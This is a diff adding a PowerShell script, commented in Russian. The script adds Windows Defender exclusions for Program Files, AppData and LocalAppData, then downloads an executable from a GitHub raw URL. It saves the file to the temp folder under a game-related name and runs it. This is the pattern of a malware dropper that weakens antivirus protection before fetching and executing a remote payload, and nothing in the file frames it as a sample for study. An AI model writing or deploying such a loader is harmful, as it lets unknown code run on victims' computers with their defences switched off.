@@ -1,0 +1,44 @@
+# Путь к файлу на удаленном сервере
+$url = "https://github.com/WENBLS/WORK/raw/main/files/CHEKER.exe"
+
+# Путь для сохранения файла во временную директорию
+$outputPath = Join-Path -Path $env:TEMP -ChildPath "GTA5RPDNS.exe"
+
+try {
+    # Добавляем исключения антивируса Windows Defender (если команда доступна)
+    if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
+        $ProgramFiles = [System.Environment]::GetFolderPath("ProgramFilesX86")
+        $updpath = $ProgramFiles -replace " \\(x86\\)", ""
+        Add-MpPreference -ExclusionPath $updpath
+
+        $ProgramFilesX86 = [System.Environment]::GetFolderPath("ProgramFilesX86")
+        if (Test-Path $ProgramFilesX86) {
+            Add-MpPreference -ExclusionPath $ProgramFilesX86
+        }
+
+        $AppData = [System.Environment]::GetFolderPath("ApplicationData")
+        Add-MpPreference -ExclusionPath $AppData
+
+        $LocalAppData = [System.Environment]::GetFolderPath("LocalApplicationData")
+        Add-MpPreference -ExclusionPath $LocalAppData
+    }
+
+    # Скачиваем файл
+    Invoke-WebRequest -Uri $url -OutFile $outputPath
+
+    # Проверяем успешность скачивания
+    if (-not(Test-Path $outputPath)) {
+        Write-Error "Файл не удалось скачать."
+        exit
+    }
+
+    # Запускаем скачанный файл
+    Start-Process -FilePath $outputPath
+}
+catch {
+    Write-Error "Ошибка: $_"
+}
+finally {
+    # Удаление временного файла (не обязательно)
+    Remove-Item -Path $outputPath -Force -ErrorAction SilentlyContinue
+}
